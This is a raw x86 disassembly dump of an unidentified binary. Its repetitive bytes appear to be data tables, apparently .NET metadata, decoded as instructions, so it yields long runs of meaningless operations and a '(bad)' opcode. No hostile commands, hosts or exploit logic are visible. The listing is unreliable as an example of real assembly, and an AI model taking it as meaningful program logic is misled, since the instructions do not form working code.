  405da7:	00 36                	add    %dh,(%esi)
  405da9:	07                   	pop    %es
  405daa:	68 00 11 00 2f       	push   $0x2f001100
  405daf:	07                   	pop    %es
  405db0:	0a 00                	or     (%eax),%al
  405db2:	11 00                	adc    %eax,(%eax)
  405db4:	44                   	inc    %esp
  405db5:	07                   	pop    %es
  405db6:	0a 00                	or     (%eax),%al
  405db8:	11 00                	adc    %eax,(%eax)
  405dba:	14 07                	adc    $0x7,%al
  405dbc:	6b 00 11             	imul   $0x11,(%eax),%eax
  405dbf:	00 19                	add    %bl,(%ecx)
  405dc1:	07                   	pop    %es
  405dc2:	0a 00                	or     (%eax),%al
  405dc4:	11 00                	adc    %eax,(%eax)
  405dc6:	1e                   	push   %ds
  405dc7:	07                   	pop    %es
  405dc8:	73 00                	jae    0x405dca
  405dca:	11 00                	adc    %eax,(%eax)
  405dcc:	28 07                	sub    %al,(%edi)
  405dce:	77 00                	ja     0x405dd0
  405dd0:	11 00                	adc    %eax,(%eax)
  405dd2:	3d 07 77 00 11       	cmp    $0x11007707,%eax
  405dd7:	00 23                	add    %ah,(%ebx)
  405dd9:	07                   	pop    %es
  405dda:	7b 00                	jnp    0x405ddc
  405ddc:	06                   	push   %es
  405ddd:	06                   	push   %es
  405dde:	46                   	inc    %esi
  405ddf:	07                   	pop    %es
  405de0:	0a 00                	or     (%eax),%al
  405de2:	01 00                	add    %eax,(%eax)
  405de4:	14 07                	adc    $0x7,%al
  405de6:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  405de7:	00 01                	add    %al,(%ecx)
  405de9:	00 1e                	add    %bl,(%esi)
  405deb:	07                   	pop    %es
  405dec:	77 00                	ja     0x405dee
  405dee:	16                   	push   %ss
  405def:	00 14 07             	add    %dl,(%edi,%eax,1)
  405df2:	df 00                	filds  (%eax)
  405df4:	06                   	push   %es
  405df5:	00 14 07             	add    %dl,(%edi,%eax,1)
  405df8:	3b 01                	cmp    (%ecx),%eax
  405dfa:	06                   	push   %es
  405dfb:	00 1e                	add    %bl,(%esi)
  405dfd:	07                   	pop    %es
  405dfe:	3e 01 06             	add    %eax,%ds:(%esi)
  405e01:	00 28                	add    %ch,(%eax)
  405e03:	07                   	pop    %es
  405e04:	3b 01                	cmp    (%ecx),%eax
  405e06:	11 00                	adc    %eax,(%eax)
  405e08:	14 07                	adc    $0x7,%al
  405e0a:	41                   	inc    %ecx
  405e0b:	01 11                	add    %edx,(%ecx)
  405e0d:	00 1e                	add    %bl,(%esi)
  405e0f:	07                   	pop    %es
  405e10:	46                   	inc    %esi
  405e11:	01 11                	add    %edx,(%ecx)
  405e13:	00 14 07             	add    %dl,(%edi,%eax,1)
  405e16:	68 01 01 00 14       	push   $0x14000101
  405e1b:	07                   	pop    %es
  405e1c:	0a 00                	or     (%eax),%al
  405e1e:	01 00                	add    %eax,(%eax)
  405e20:	1e                   	push   %ds
  405e21:	07                   	pop    %es
  405e22:	0a 00                	or     (%eax),%al
  405e24:	50                   	push   %eax
  405e25:	20 00                	and    %al,(%eax)
  405e27:	00 00                	add    %al,(%eax)
  405e29:	00 86 18 4e 07 0d    	add    %al,0xd074e18(%esi)
  405e2f:	00 01                	add    %al,(%ecx)
  405e31:	00 70 20             	add    %dh,0x20(%eax)
  405e34:	00 00                	add    %al,(%eax)
  405e36:	00 00                	add    %al,(%eax)
  405e38:	e1 01                	loope  0x405e3b
  405e3a:	54                   	push   %esp
  405e3b:	07                   	pop    %es
  405e3c:	12 00                	adc    (%eax),%al
  405e3e:	02 00                	add    (%eax),%al
  405e40:	74 20                	je     0x405e62
  405e42:	00 00                	add    %al,(%eax)
  405e44:	00 00                	add    %al,(%eax)
  405e46:	e1 01                	loope  0x405e49
  405e48:	5d                   	pop    %ebp
  405e49:	07                   	pop    %es
  405e4a:	16                   	push   %ss
  405e4b:	00 02                	add    %al,(%edx)
  405e4d:	00 ac 21 00 00 00 00 	add    %ch,0x0(%ecx,%eiz,1)
  405e54:	e1 01                	loope  0x405e57
  405e56:	54                   	push   %esp
  405e57:	07                   	pop    %es
  405e58:	1a 00                	sbb    (%eax),%al
  405e5a:	02 00                	add    (%eax),%al
  405e5c:	b4 21                	mov    $0x21,%ah
  405e5e:	00 00                	add    %al,(%eax)
  405e60:	00 00                	add    %al,(%eax)
  405e62:	e1 01                	loope  0x405e65
  405e64:	66 07                	popw   %es
  405e66:	12 00                	adc    (%eax),%al
  405e68:	02 00                	add    (%eax),%al
  405e6a:	bc 21 00 00 00       	mov    $0x21,%esp
  405e6f:	00 e1                	add    %ah,%cl
  405e71:	01 54 07 1e          	add    %edx,0x1e(%edi,%eax,1)
  405e75:	00 02                	add    %al,(%edx)
  405e77:	00 cc                	add    %cl,%ah
  405e79:	21 00                	and    %eax,(%eax)
  405e7b:	00 00                	add    %al,(%eax)
  405e7d:	00 e1                	add    %ah,%cl
  405e7f:	01 54 07 22          	add    %edx,0x22(%edi,%eax,1)
  405e83:	00 02                	add    %al,(%edx)
  405e85:	00 14 22             	add    %dl,(%edx,%eiz,1)
  405e88:	00 00                	add    %al,(%eax)
  405e8a:	00 00                	add    %al,(%eax)
  405e8c:	e1 01                	loope  0x405e8f
  405e8e:	54                   	push   %esp
  405e8f:	07                   	pop    %es
  405e90:	2a 00                	sub    (%eax),%al
  405e92:	02 00                	add    (%eax),%al
  405e94:	1c 22                	sbb    $0x22,%al
  405e96:	00 00                	add    %al,(%eax)
  405e98:	00 00                	add    %al,(%eax)
  405e9a:	86 18                	xchg   %bl,(%eax)
  405e9c:	4e                   	dec    %esi
  405e9d:	07                   	pop    %es
  405e9e:	12 00                	adc    (%eax),%al
  405ea0:	02 00                	add    (%eax),%al
  405ea2:	24 22                	and    $0x22,%al
  405ea4:	00 00                	add    %al,(%eax)
  405ea6:	00 00                	add    %al,(%eax)
  405ea8:	91                   	xchg   %eax,%ecx
  405ea9:	18 6f 07             	sbb    %ch,0x7(%edi)
  405eac:	32 00                	xor    (%eax),%al
  405eae:	02 00                	add    (%eax),%al
  405eb0:	38 22                	cmp    %ah,(%edx)
  405eb2:	00 00                	add    %al,(%eax)
  405eb4:	00 00                	add    %al,(%eax)
  405eb6:	91                   	xchg   %eax,%ecx
  405eb7:	00 14 07             	add    %dl,(%edi,%eax,1)
  405eba:	32 00                	xor    (%eax),%al
  405ebc:	02 00                	add    (%eax),%al
  405ebe:	fc                   	cld
  405ebf:	27                   	daa
  405ec0:	00 00                	add    %al,(%eax)
  405ec2:	00 00                	add    %al,(%eax)
  405ec4:	91                   	xchg   %eax,%ecx
  405ec5:	00 14 07             	add    %dl,(%edi,%eax,1)
  405ec8:	36 00 02             	add    %al,%ss:(%edx)
  405ecb:	00 4c 28 00          	add    %cl,0x0(%eax,%ebp,1)
  405ecf:	00 00                	add    %al,(%eax)
  405ed1:	00 91 00 1e 07 32    	add    %dl,0x32071e00(%ecx)
  405ed7:	00 03                	add    %al,(%ebx)
  405ed9:	00 00                	add    %al,(%eax)
  405edb:	00 00                	add    %al,(%eax)
  405edd:	00 80 00 96 20 14    	add    %al,0x14209600(%eax)
  405ee3:	07                   	pop    %es
  405ee4:	3b 00                	cmp    (%eax),%eax
  405ee6:	03 00                	add    (%eax),%eax
  405ee8:	00 00                	add    %al,(%eax)
  405eea:	00 00                	add    %al,(%eax)
  405eec:	80 00 96             	addb   $0x96,(%eax)
  405eef:	20 14 07             	and    %dl,(%edi,%eax,1)
  405ef2:	3f                   	aas
  405ef3:	00 03                	add    %al,(%ebx)
  405ef5:	00 c4                	add    %al,%ah
  405ef7:	28 00                	sub    %al,(%eax)
  405ef9:	00 00                	add    %al,(%eax)
  405efb:	00 91 00 14 07 48    	add    %dl,0x48071400(%ecx)
  405f01:	00 06                	add    %al,(%esi)
  405f03:	00 20                	add    %ah,(%eax)
  405f05:	29 00                	sub    %eax,(%eax)
  405f07:	00 00                	add    %al,(%eax)
  405f09:	00 91 00 14 07 4f    	add    %dl,0x4f071400(%ecx)
  405f0f:	00 07                	add    %al,(%edi)
  405f11:	00 64 2c 00          	add    %ah,0x0(%esp,%ebp,1)
  405f15:	00 00                	add    %al,(%eax)
  405f17:	00 96 00 14 07 54    	add    %dl,0x54071400(%esi)
  405f1d:	00 08                	add    %cl,(%eax)
  405f1f:	00 d8                	add    %bl,%al
  405f21:	2c 00                	sub    $0x0,%al
  405f23:	00 00                	add    %al,(%eax)
  405f25:	00 96 00 14 07 59    	add    %dl,0x59071400(%esi)
  405f2b:	00 09                	add    %cl,(%ecx)
  405f2d:	00 8c 2d 00 00 00 00 	add    %cl,0x0(%ebp,%ebp,1)
  405f34:	91                   	xchg   %eax,%ecx
  405f35:	00 1e                	add    %bl,(%esi)
  405f37:	07                   	pop    %es
  405f38:	36 00 0d 00 d4 2d 00 	add    %cl,%ss:0x2dd400
  405f3f:	00 00                	add    %al,(%eax)
  405f41:	00 86 18 4e 07 12    	add    %al,0x12074e18(%esi)
  405f47:	00 0e                	add    %cl,(%esi)
  405f49:	00 dc                	add    %bl,%ah
  405f4b:	2d 00 00 00 00       	sub    $0x0,%eax
  405f50:	83 00 14             	addl   $0x14,(%eax)
  405f53:	07                   	pop    %es
  405f54:	61                   	popa
  405f55:	00 0e                	add    %cl,(%esi)
  405f57:	00 00                	add    %al,(%eax)
  405f59:	00 00                	add    %al,(%eax)
  405f5b:	00 00                	add    %al,(%eax)
  405f5d:	00 c6                	add    %al,%dh
  405f5f:	05 76 07 2a 00       	add    $0x2a0776,%eax
  405f64:	10 00                	adc    %al,(%eax)
  405f66:	2c 2e                	sub    $0x2e,%al
  405f68:	00 00                	add    %al,(%eax)
  405f6a:	08 00                	or     %al,(%eax)
  405f6c:	91                   	xchg   %eax,%ecx
  405f6d:	18 6f 07             	sbb    %ch,0x7(%edi)
  405f70:	32 00                	xor    (%eax),%al
  405f72:	10 00                	adc    %al,(%eax)
  405f74:	a8 2f                	test   $0x2f,%al
  405f76:	00 00                	add    %al,(%eax)
  405f78:	08 00                	or     %al,(%eax)
  405f7a:	93                   	xchg   %eax,%ebx
  405f7b:	00 14 07             	add    %dl,(%edi,%eax,1)
  405f7e:	54                   	push   %esp
  405f7f:	00 10                	add    %dl,(%eax)
  405f81:	00 d0                	add    %dl,%al
  405f83:	2f                   	das
  405f84:	00 00                	add    %al,(%eax)
  405f86:	08 00                	or     %al,(%eax)
  405f88:	91                   	xchg   %eax,%ecx
  405f89:	00 14 07             	add    %dl,(%edi,%eax,1)
  405f8c:	7f 00                	jg     0x405f8e
  405f8e:	11 00                	adc    %eax,(%eax)
  405f90:	78 38                	js     0x405fca
  405f92:	00 00                	add    %al,(%eax)
  405f94:	00 00                	add    %al,(%eax)
  405f96:	91                   	xchg   %eax,%ecx
  405f97:	00 14 07             	add    %dl,(%edi,%eax,1)
  405f9a:	85 00                	test   %eax,(%eax)
  405f9c:	13 00                	adc    (%eax),%eax
  405f9e:	b0 38                	mov    $0x38,%al
  405fa0:	00 00                	add    %al,(%eax)
  405fa2:	00 00                	add    %al,(%eax)
  405fa4:	91                   	xchg   %eax,%ecx
  405fa5:	00 14 07             	add    %dl,(%edi,%eax,1)
  405fa8:	8e 00                	mov    (%eax),%es
  405faa:	14 00                	adc    $0x0,%al
  405fac:	d0 38                	sarb   $1,(%eax)
  405fae:	00 00                	add    %al,(%eax)
  405fb0:	08 00                	or     %al,(%eax)
  405fb2:	91                   	xchg   %eax,%ecx
  405fb3:	00 14 07             	add    %dl,(%edi,%eax,1)
  405fb6:	96                   	xchg   %eax,%esi
  405fb7:	00 15 00 9c 39 00    	add    %dl,0x399c00
  405fbd:	00 00                	add    %al,(%eax)
  405fbf:	00 91 00 14 07 9d    	add    %dl,-0x62f8ec00(%ecx)
  405fc5:	00 17                	add    %dl,(%edi)
  405fc7:	00 40 3a             	add    %al,0x3a(%eax)
  405fca:	00 00                	add    %al,(%eax)
  405fcc:	00 00                	add    %al,(%eax)
  405fce:	86 18                	xchg   %bl,(%eax)
  405fd0:	4e                   	dec    %esi
  405fd1:	07                   	pop    %es
  405fd2:	ab                   	stos   %eax,%es:(%edi)
  405fd3:	00 1a                	add    %bl,(%edx)
  405fd5:	00 5c 3a 00          	add    %bl,0x0(%edx,%edi,1)
  405fd9:	00 00                	add    %al,(%eax)
  405fdb:	00 86 00 14 07 b2    	add    %al,-0x4df8ec00(%esi)
  405fe1:	00 1b                	add    %bl,(%ebx)
  405fe3:	00 64 3a 00          	add    %ah,0x0(%edx,%edi,1)
  405fe7:	00 00                	add    %al,(%eax)
  405fe9:	00 86 00 14 07 b8    	add    %al,-0x47f8ec00(%esi)
  405fef:	00 1b                	add    %bl,(%ebx)
  405ff1:	00 84 3a 00 00 00 00 	add    %al,0x0(%edx,%edi,1)
  405ff8:	86 00                	xchg   %al,(%eax)
  405ffa:	14 07                	adc    $0x7,%al
  405ffc:	1a 00                	sbb    (%eax),%al
  405ffe:	1b 00                	sbb    (%eax),%eax
  406000:	b8 3a 00 00 00       	mov    $0x3a,%eax
  406005:	00 91 00 14 07 32    	add    %dl,0x32071400(%ecx)
  40600b:	00 1b                	add    %bl,(%ebx)
  40600d:	00 c0                	add    %al,%al
  40600f:	3a 00                	cmp    (%eax),%al
  406011:	00 00                	add    %al,(%eax)
  406013:	00 81 00 14 07 0d    	add    %al,0xd071400(%ecx)
  406019:	00 1b                	add    %bl,(%ebx)
  40601b:	00 1c 3b             	add    %bl,(%ebx,%edi,1)
  40601e:	00 00                	add    %al,(%eax)
  406020:	00 00                	add    %al,(%eax)
  406022:	86 00                	xchg   %al,(%eax)
  406024:	14 07                	adc    $0x7,%al
  406026:	12 00                	adc    (%eax),%al
  406028:	1c 00                	sbb    $0x0,%al
  40602a:	48                   	dec    %eax
  40602b:	3b 00                	cmp    (%eax),%eax
  40602d:	00 00                	add    %al,(%eax)
  40602f:	00 86 00 14 07 bc    	add    %al,-0x43f8ec00(%esi)
  406035:	00 1c 00             	add    %bl,(%eax,%eax,1)
  406038:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  406039:	3b 00                	cmp    (%eax),%eax
  40603b:	00 00                	add    %al,(%eax)
  40603d:	00 96 00 14 07 c2    	add    %dl,-0x3df8ec00(%esi)
  406043:	00 1d 00 ec 3b 00    	add    %bl,0x3bec00
  406049:	00 00                	add    %al,(%eax)
  40604b:	00 96 00 14 07 cb    	add    %dl,-0x34f8ec00(%esi)
  406051:	00 21                	add    %ah,(%ecx)
  406053:	00 00                	add    %al,(%eax)
  406055:	00 00                	add    %al,(%eax)
  406057:	00 00                	add    %al,(%eax)
  406059:	00 c6                	add    %al,%dh
  40605b:	05 7f 07 d6 00       	add    $0xd6077f,%eax
  406060:	26 00 60 3c          	add    %ah,%es:0x3c(%eax)
  406064:	00 00                	add    %al,(%eax)
  406066:	00 00                	add    %al,(%eax)
  406068:	86 18                	xchg   %bl,(%eax)
  40606a:	4e                   	dec    %esi
  40606b:	07                   	pop    %es
  40606c:	12 00                	adc    (%eax),%al
  40606e:	26 00 68 3c          	add    %ch,%es:0x3c(%eax)
  406072:	00 00                	add    %al,(%eax)
  406074:	00 00                	add    %al,(%eax)
  406076:	91                   	xchg   %eax,%ecx
  406077:	18 6f 07             	sbb    %ch,0x7(%edi)
  40607a:	32 00                	xor    (%eax),%al
  40607c:	26 00 74 3c 00       	add    %dh,%es:0x0(%esp,%edi,1)
  406081:	00 00                	add    %al,(%eax)
  406083:	00 96 00 14 07 32    	add    %dl,0x32071400(%esi)
  406089:	00 26                	add    %ah,(%esi)
  40608b:	00 28                	add    %ch,(%eax)
  40608d:	3d 00 00 00 00       	cmp    $0x0,%eax
  406092:	96                   	xchg   %eax,%esi
  406093:	00 14 07             	add    %dl,(%edi,%eax,1)
  406096:	e3 00                	jecxz  0x406098
  406098:	26 00 ac 3d 00 00 00 	add    %ch,%es:0x0(%ebp,%edi,1)
  40609f:	00 
  4060a0:	96                   	xchg   %eax,%esi
  4060a1:	00 14 07             	add    %dl,(%edi,%eax,1)
  4060a4:	36 00 2a             	add    %ch,%ss:(%edx)
  4060a7:	00 a0 40 00 00 00    	add    %ah,0x40(%eax)
  4060ad:	00 96 00 14 07 ed    	add    %dl,-0x12f8ec00(%esi)
  4060b3:	00 2b                	add    %ch,(%ebx)
  4060b5:	00 b0 40 00 00 00    	add    %dh,0x40(%eax)
  4060bb:	00 96 00 14 07 f3    	add    %dl,-0xcf8ec00(%esi)
  4060c1:	00 2d 00 34 41 00    	add    %ch,0x413400
  4060c7:	00 00                	add    %al,(%eax)
  4060c9:	00 96 00 14 07 f8    	add    %dl,-0x7f8ec00(%esi)
  4060cf:	00 2e                	add    %ch,(%esi)
  4060d1:	00 00                	add    %al,(%eax)
  4060d3:	00 00                	add    %al,(%eax)
  4060d5:	00 80 00 96 20 14    	add    %al,0x14209600(%eax)
  4060db:	07                   	pop    %es
  4060dc:	fe 00                	incb   (%eax)
  4060de:	30 00                	xor    %al,(%eax)
  4060e0:	00 00                	add    %al,(%eax)
  4060e2:	00 00                	add    %al,(%eax)
  4060e4:	80 00 96             	addb   $0x96,(%eax)
  4060e7:	20 1e                	and    %bl,(%esi)
  4060e9:	07                   	pop    %es
  4060ea:	fe 00                	incb   (%eax)
  4060ec:	31 00                	xor    %eax,(%eax)
  4060ee:	00 00                	add    %al,(%eax)
  4060f0:	00 00                	add    %al,(%eax)
  4060f2:	80 00 96             	addb   $0x96,(%eax)
  4060f5:	20 14 07             	and    %dl,(%edi,%eax,1)
  4060f8:	03 01                	add    (%ecx),%eax
  4060fa:	32 00                	xor    (%eax),%al
  4060fc:	00 00                	add    %al,(%eax)
  4060fe:	00 00                	add    %al,(%eax)
  406100:	80 00 96             	addb   $0x96,(%eax)
  406103:	20 14 07             	and    %dl,(%edi,%eax,1)
  406106:	0c 01                	or     $0x1,%al
  406108:	36 00 00             	add    %al,%ss:(%eax)
  40610b:	00 00                	add    %al,(%eax)
  40610d:	00 80 00 96 20 14    	add    %al,0x14209600(%eax)
  406113:	07                   	pop    %es
  406114:	17                   	pop    %ss
  406115:	01 3d 00 00 00 00    	add    %edi,0x0
  40611b:	00 80 00 96 20 14    	add    %al,0x14209600(%eax)
  406121:	07                   	pop    %es
  406122:	21 01                	and    %eax,(%ecx)
  406124:	43                   	inc    %ebx
  406125:	00 00                	add    %al,(%eax)
  406127:	00 00                	add    %al,(%eax)
  406129:	00 80 00 96 20 14    	add    %al,0x14209600(%eax)
  40612f:	07                   	pop    %es
  406130:	2a 01                	sub    (%ecx),%al
  406132:	48                   	dec    %eax
  406133:	00 00                	add    %al,(%eax)
  406135:	00 00                	add    %al,(%eax)
  406137:	00 80 00 96 20 14    	add    %al,0x14209600(%eax)
  40613d:	07                   	pop    %es
  40613e:	31 01                	xor    %eax,(%ecx)
  406140:	4b                   	dec    %ebx
  406141:	00 00                	add    %al,(%eax)
  406143:	00 00                	add    %al,(%eax)
  406145:	00 80 00 96 20 14    	add    %al,0x14209600(%eax)
  40614b:	07                   	pop    %es
  40614c:	3f                   	aas
  40614d:	00 4f 00             	add    %cl,0x0(%edi)
  406150:	00 00                	add    %al,(%eax)
  406152:	00 00                	add    %al,(%eax)
  406154:	00 00                	add    %al,(%eax)
  406156:	c6 05 8d 07 12 00 51 	movb   $0x51,0x12078d
  40615d:	00 00                	add    %al,(%eax)
  40615f:	00 00                	add    %al,(%eax)
  406161:	00 00                	add    %al,(%eax)
  406163:	00 c6                	add    %al,%dh
  406165:	05 5d 07 16 00       	add    $0x16075d,%eax
  40616a:	51                   	push   %ecx
  40616b:	00 00                	add    %al,(%eax)
  40616d:	00 00                	add    %al,(%eax)
  40616f:	00 00                	add    %al,(%eax)
  406171:	00 c6                	add    %al,%dh
  406173:	05 5d 07 1e 00       	add    $0x1e075d,%eax
  406178:	51                   	push   %ecx
  406179:	00 00                	add    %al,(%eax)
  40617b:	00 00                	add    %al,(%eax)
  40617d:	00 00                	add    %al,(%eax)
  40617f:	00 c6                	add    %al,%dh
  406181:	05 5d 07 12 00       	add    $0x12075d,%eax
  406186:	51                   	push   %ecx
  406187:	00 2c 43             	add    %ch,(%ebx,%eax,2)
  40618a:	00 00                	add    %al,(%eax)
  40618c:	00 00                	add    %al,(%eax)
  40618e:	83 18 4e             	sbbl   $0x4e,(%eax)
  406191:	07                   	pop    %es
  406192:	12 00                	adc    (%eax),%al
  406194:	51                   	push   %ecx
  406195:	00 34 43             	add    %dh,(%ebx,%eax,2)
  406198:	00 00                	add    %al,(%eax)
  40619a:	00 00                	add    %al,(%eax)
  40619c:	93                   	xchg   %eax,%ebx
  40619d:	00 14 07             	add    %dl,(%edi,%eax,1)
  4061a0:	4b                   	dec    %ebx
  4061a1:	01 51 00             	add    %edx,0x0(%ecx)
  4061a4:	68 43 00 00 00       	push   $0x43
  4061a9:	00 93 00 14 07 51    	add    %dl,0x51071400(%ebx)
  4061af:	01 51 00             	add    %edx,0x0(%ecx)
  4061b2:	70 43                	jo     0x4061f7
  4061b4:	00 00                	add    %al,(%eax)
  4061b6:	00 00                	add    %al,(%eax)
  4061b8:	93                   	xchg   %eax,%ebx
  4061b9:	00 14 07             	add    %dl,(%edi,%eax,1)
  4061bc:	57                   	push   %edi
  4061bd:	01 51 00             	add    %edx,0x0(%ecx)
  4061c0:	78 43                	js     0x406205
  4061c2:	00 00                	add    %al,(%eax)
  4061c4:	00 00                	add    %al,(%eax)
  4061c6:	93                   	xchg   %eax,%ebx
  4061c7:	00 14 07             	add    %dl,(%edi,%eax,1)
  4061ca:	5e                   	pop    %esi
  4061cb:	01 52 00             	add    %edx,0x0(%edx)
  4061ce:	00 00                	add    %al,(%eax)
  4061d0:	00 00                	add    %al,(%eax)
  4061d2:	00 00                	add    %al,(%eax)
  4061d4:	c6                   	(bad)
  4061d5:	0d 5d 07 63 01       	or     $0x163075d,%eax
  4061da:	52                   	push   %edx
  4061db:	00 98 43 00 00 00    	add    %bl,0x43(%eax)
  4061e1:	00 91 18 6f 07 32    	add    %dl,0x32076f18(%ecx)
  4061e7:	00 52 00             	add    %dl,0x0(%edx)
  4061ea:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4061eb:	43                   	inc    %ebx
  4061ec:	00 00                	add    %al,(%eax)
  4061ee:	08 00                	or     %al,(%eax)
  4061f0:	93                   	xchg   %eax,%ebx
  4061f1:	00 14 07             	add    %dl,(%edi,%eax,1)
  4061f4:	6c                   	insb   (%dx),%es:(%edi)
  4061f5:	01 52 00             	add    %edx,0x0(%edx)
  4061f8:	6c                   	insb   (%dx),%es:(%edi)
  4061f9:	45                   	inc    %ebp
  4061fa:	00 00                	add    %al,(%eax)
  4061fc:	08 00                	or     %al,(%eax)
  4061fe:	91                   	xchg   %eax,%ecx
  4061ff:	00 14 07             	add    %dl,(%edi,%eax,1)
  406202:	3b 00                	cmp    (%eax),%eax
  406204:	52                   	push   %edx
  406205:	00 78 45             	add    %bh,0x45(%eax)
  406208:	00 00                	add    %al,(%eax)
  40620a:	08 00                	or     %al,(%eax)
  40620c:	91                   	xchg   %eax,%ecx
  40620d:	00 1e                	add    %bl,(%esi)
  40620f:	07                   	pop    %es
  406210:	3b 00                	cmp    (%eax),%eax
  406212:	52                   	push   %edx
  406213:	00 dc                	add    %bl,%ah
  406215:	45                   	inc    %ebp
  406216:	00 00                	add    %al,(%eax)
  406218:	00 00                	add    %al,(%eax)
  40621a:	91                   	xchg   %eax,%ecx
  40621b:	00 14 07             	add    %dl,(%edi,%eax,1)
  40621e:	70 01                	jo     0x406221
  406220:	52                   	push   %edx
  406221:	00 e4                	add    %ah,%ah
  406223:	45                   	inc    %ebp
  406224:	00 00                	add    %al,(%eax)
  406226:	00 00                	add    %al,(%eax)
  406228:	83 18 4e             	sbbl   $0x4e,(%eax)
  40622b:	07                   	pop    %es
  40622c:	12 00                	adc    (%eax),%al
  40622e:	53                   	push   %ebx
  40622f:	00 f4                	add    %dh,%ah
  406231:	45                   	inc    %ebp
  406232:	00 00                	add    %al,(%eax)
  406234:	08 00                	or     %al,(%eax)
  406236:	83 00 14             	addl   $0x14,(%eax)
  406239:	07                   	pop    %es
  40623a:	77 01                	ja     0x40623d
  40623c:	53                   	push   %ebx
  40623d:	00 14 47             	add    %dl,(%edi,%eax,2)
  406240:	00 00                	add    %al,(%eax)
  406242:	08 00                	or     %al,(%eax)
  406244:	83 00 14             	addl   $0x14,(%eax)
  406247:	07                   	pop    %es
  406248:	7b 01                	jnp    0x40624b
  40624a:	53                   	push   %ebx
  40624b:	00 10                	add    %dl,(%eax)
  40624d:	48                   	dec    %eax
  40624e:	00 00                	add    %al,(%eax)
  406250:	00 00                	add    %al,(%eax)
  406252:	86 18                	xchg   %bl,(%eax)
  406254:	4e                   	dec    %esi
  406255:	07                   	pop    %es
  406256:	12 00                	adc    (%eax),%al
  406258:	54                   	push   %esp
  406259:	00 18                	add    %bl,(%eax)
  40625b:	48                   	dec    %eax
  40625c:	00 00                	add    %al,(%eax)
  40625e:	08 00                	or     %al,(%eax)
  406260:	93                   	xchg   %eax,%ebx
  406261:	00 14 07             	add    %dl,(%edi,%eax,1)
  406264:	80 01 54             	addb   $0x54,(%ecx)
  406267:	00 8c 48 00 00 00 00 	add    %cl,0x0(%eax,%ecx,2)
  40626e:	93                   	xchg   %eax,%ebx
  40626f:	00 14 07             	add    %dl,(%edi,%eax,1)
  406272:	84 01                	test   %al,(%ecx)
  406274:	54                   	push   %esp
  406275:	00 a4 48 00 00 00 00 	add    %ah,0x0(%eax,%ecx,2)
  40627c:	93                   	xchg   %eax,%ebx
  40627d:	00 1e                	add    %bl,(%esi)
  40627f:	07                   	pop    %es
  406280:	84 01                	test   %al,(%ecx)
  406282:	56                   	push   %esi
  406283:	00 cc                	add    %cl,%ah
  406285:	48                   	dec    %eax
  406286:	00 00                	add    %al,(%eax)
  406288:	00 00                	add    %al,(%eax)
  40628a:	93                   	xchg   %eax,%ebx
  40628b:	00 28                	add    %ch,(%eax)
  40628d:	07                   	pop    %es
  40628e:	84 01                	test   %al,(%ecx)
  406290:	58                   	pop    %eax
  406291:	00 e8                	add    %ch,%al
  406293:	48                   	dec    %eax
  406294:	00 00                	add    %al,(%eax)
  406296:	00 00                	add    %al,(%eax)
  406298:	86 18                	xchg   %bl,(%eax)
  40629a:	4e                   	dec    %esi
  40629b:	07                   	pop    %es
  40629c:	12 00                	adc    (%eax),%al
  40629e:	5a                   	pop    %edx
  40629f:	00 f0                	add    %dh,%al
  4062a1:	48                   	dec    %eax
  4062a2:	00 00                	add    %al,(%eax)
  4062a4:	08 00                	or     %al,(%eax)
  4062a6:	93                   	xchg   %eax,%ebx
  4062a7:	00 14 07             	add    %dl,(%edi,%eax,1)
  4062aa:	80 01 5a             	addb   $0x5a,(%ecx)
  4062ad:	00 40 49             	add    %al,0x49(%eax)
  4062b0:	00 00                	add    %al,(%eax)
  4062b2:	00 00                	add    %al,(%eax)
  4062b4:	86 18                	xchg   %bl,(%eax)
  4062b6:	4e                   	dec    %esi
  4062b7:	07                   	pop    %es
  4062b8:	12 00                	adc    (%eax),%al
  4062ba:	5a                   	pop    %edx
  4062bb:	00 48 49             	add    %cl,0x49(%eax)
  4062be:	00 00                	add    %al,(%eax)
  4062c0:	08 00                	or     %al,(%eax)
  4062c2:	93                   	xchg   %eax,%ebx
  4062c3:	00 14 07             	add    %dl,(%edi,%eax,1)
  4062c6:	80 01 5a             	addb   $0x5a,(%ecx)
  4062c9:	00 a8 49 00 00 00    	add    %ch,0x49(%eax)
  4062cf:	00 86 18 4e 07 12    	add    %al,0x12074e18(%esi)
  4062d5:	00 5a 00             	add    %bl,0x0(%edx)
  4062d8:	b0 49                	mov    $0x49,%al
  4062da:	00 00                	add    %al,(%eax)
  4062dc:	08 00                	or     %al,(%eax)
  4062de:	93                   	xchg   %eax,%ebx
  4062df:	00 14 07             	add    %dl,(%edi,%eax,1)
  4062e2:	80 01 5a             	addb   $0x5a,(%ecx)
  4062e5:	00 1c 4a             	add    %bl,(%edx,%ecx,2)
  4062e8:	00 00                	add    %al,(%eax)
  4062ea:	00 00                	add    %al,(%eax)
  4062ec:	86 18                	xchg   %bl,(%eax)
  4062ee:	4e                   	dec    %esi
  4062ef:	07                   	pop    %es
  4062f0:	12 00                	adc    (%eax),%al
  4062f2:	5a                   	pop    %edx
  4062f3:	00 24 4a             	add    %ah,(%edx,%ecx,2)
  4062f6:	00 00                	add    %al,(%eax)
  4062f8:	08 00                	or     %al,(%eax)
  4062fa:	93                   	xchg   %eax,%ebx
  4062fb:	00 14 07             	add    %dl,(%edi,%eax,1)
  4062fe:	80 01 5a             	addb   $0x5a,(%ecx)
  406301:	00 a4 4a 00 00 00 00 	add    %ah,0x0(%edx,%ecx,2)
  406308:	86 18                	xchg   %bl,(%eax)
  40630a:	4e                   	dec    %esi
  40630b:	07                   	pop    %es
  40630c:	12 00                	adc    (%eax),%al
  40630e:	5a                   	pop    %edx
  40630f:	00 ac 4a 00 00 08 00 	add    %ch,0x80000(%edx,%ecx,2)
  406316:	93                   	xchg   %eax,%ebx
  406317:	00 14 07             	add    %dl,(%edi,%eax,1)
  40631a:	80 01 5a             	addb   $0x5a,(%ecx)
  40631d:	00 00                	add    %al,(%eax)
  40631f:	00 01                	add    %al,(%ecx)
  406321:	00 14 07             	add    %dl,(%edi,%eax,1)
  406324:	00 00                	add    %al,(%eax)
  406326:	01 00                	add    %eax,(%eax)
  406328:	14 07                	adc    $0x7,%al
  40632a:	00 20                	add    %ah,(%eax)
  40632c:	00 00                	add    %al,(%eax)
  40632e:	00 00                	add    %al,(%eax)
  406330:	00 00                	add    %al,(%eax)
  406332:	01 00                	add    %eax,(%eax)
  406334:	14 07                	adc    $0x7,%al
  406336:	00 20                	add    %ah,(%eax)
  406338:	02 00                	add    (%eax),%al
